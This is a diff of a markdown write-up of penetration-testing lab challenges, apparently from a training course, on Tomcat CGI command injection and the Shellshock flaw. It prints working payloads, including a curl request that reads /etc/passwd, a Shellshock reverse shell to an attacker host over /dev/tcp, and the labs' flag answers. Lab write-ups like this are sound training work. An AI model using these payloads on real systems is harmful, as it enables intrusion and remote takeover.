@@ -24,6 +24,9 @@
     1. [osTicket](#osticket)
     2. [GitLab - Discovery & Enumeration](#gitlab---discovery--enumeration)
     3. [Attacking GitLab](#attacking-gitlab)
+6. [Common Gateway Interfaces](#common-gateway-interfaces-1)
+    1. [Attacking Tomcat CGI](#attacking-tomcat-cgi)
+    2. [Attacking Common Gateway Interface (CGI) Applications - Shellshock](#attacking-common-gateway-interface-cgi-applications---shellshock)
 
 ## Tools
 ### Application Discovery & Enumeration
@@ -46,6 +49,8 @@
 ### Customer Service Mgmt & Configuration Management
 - [gitlab_userenum.py](https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/refs/heads/main/gitlab_userenum.py)
 - [gitlab_13_10_2_rce.py](https://www.exploit-db.com/exploits/49951)
+### Common Gateway Interfaces
+- ffuf
 
 ## Setting the Stage
 ### Application Discovery & Enumeration
@@ -522,3 +527,79 @@
     ![alt text](<Assets/Attacking GitLab - 2.png>)
     
     The answer is `s3cure_y0ur_Rep0s!`.
+
+## Common Gateway Interfaces
+### Attacking Tomcat CGI
+#### Challenges
+1. After running the URL Encoded 'whoami' payload, what user is tomcat running as?
+
+    The main contain of the module is about tomcat cgi exploitaion with command injection. There are several condition to make this exploitation work.
+
+    - Operating System: The server must be running on Windows
+    - Configuration: The setting enableCmdLineArguments must be set to true in the CGI configuration.
+    - Version: The Tomcat version must be one of the affected ranges:
+        1. 9.0.0.M1 to 9.0.17
+        2. 8.5.0 to 8.5.39
+        3. 7.0.0 to 7.0.93
+    
+    So, in here, we need to enumerate the target host to check the condition.
+
+    ```bash
+    nmap -sV -p135,139,445,5985,47001,8080  10.129.205.30
+    ```
+    ![alt text](<Assets/Attacking Tomcat CGI - 1.png>)
+
+    Based on the output, we can see that the target host is running on Windows and the version is 9.0.17 which is in the affected range. How about the configuration? we dont know yet. Also, we dont know if it has CGI or not. We can use **ffuf** to find the CGI script.
+
+    ```bash
+    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat -t 500
+    ```
+    ![alt text](<Assets/Attacking Tomcat CGI - 2.png>)
+
+    We found the CGI script. Now, we can use this CGI script to execute command. We can use **curl** to do this.
+
+    ```bash
+    curl -s http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+    ```
+    ![alt text](<Assets/Attacking Tomcat CGI - 3.png>)
+    
+    The answer is `feldspar\omen`.
+
+### Attacking Common Gateway Interface (CGI) Applications - Shellshock
+#### Challenges
+1. Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.
+
+    The main content of this module is about exploiting Shellshock vulnerability via cgi. There are several condition to make this exploitation work.
+
+    - The Server must use CGI (Common Gateway Interface)
+    - The Script must invoke Bash
+    - The Bash Version must be Vulnerable
+    - Data must be passed to Environment Variables
+
+    We can use **ffuf** to enumerate to make sure that this server has cgi script/using cgi.
+
+    ```bash
+    ffuf -w /usr/share/wordlists/dirb/small.txt -u http://10.129.205.27/cgi-bin/FUZZ.cgi -t 500
+    ```
+    ![alt text](<Assets/Attacking Common Gateway Interface (CGI) Applications - Shellshock - 1.png>)
+
+    We found `/access.cgi` in there. Then, we can confirm the vuln by using this payload.
+
+    ```bash
+    curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
+    ```
+    ![alt text](<Assets/Attacking Common Gateway Interface (CGI) Applications - Shellshock - 2 .png>)
+
+    We can see that the server is vulnerable. Now, we can use this vulnerability to get reverse shell. We can set up the listener.
+
+    ```bash
+    sudo nc -lvnp 7777
+    ```
+    Then, we can use this payload to get reverse shell.
+
+    ```bash
+    curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.131/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
+    ```
+    ![alt text](<Assets/Attacking Common Gateway Interface (CGI) Applications - Shellshock - 3.png>)
+
+    The answer is `Sh3ll_Sh0cK_123`.
